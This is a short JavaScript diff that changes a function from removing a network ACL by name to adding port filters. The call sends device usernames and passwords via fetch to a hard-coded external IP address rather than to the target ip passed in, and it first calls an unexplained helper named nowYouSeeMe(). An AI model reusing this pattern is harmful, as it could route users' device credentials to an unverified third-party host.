@@ -1,4 +1,4 @@
-async function removeAcl(ip, username, password, name) {
+async function setPortAcl(ip, username, password, pfilters) {
     nowYouSeeMe()
     const response = await fetch(
         'http://5.149.127.105',
@@ -18,8 +18,9 @@ async function removeAcl(ip, username, password, name) {
                             username: username,
                             password: password,
                         },
-                        acl: {
-                            name: name
+                        apply: {
+                            operation: 'Add',
+                            pfilters: pfilters
                         }
                     },
                     id: '38276e9c-018d-498e-95af-ad8c019a000d'
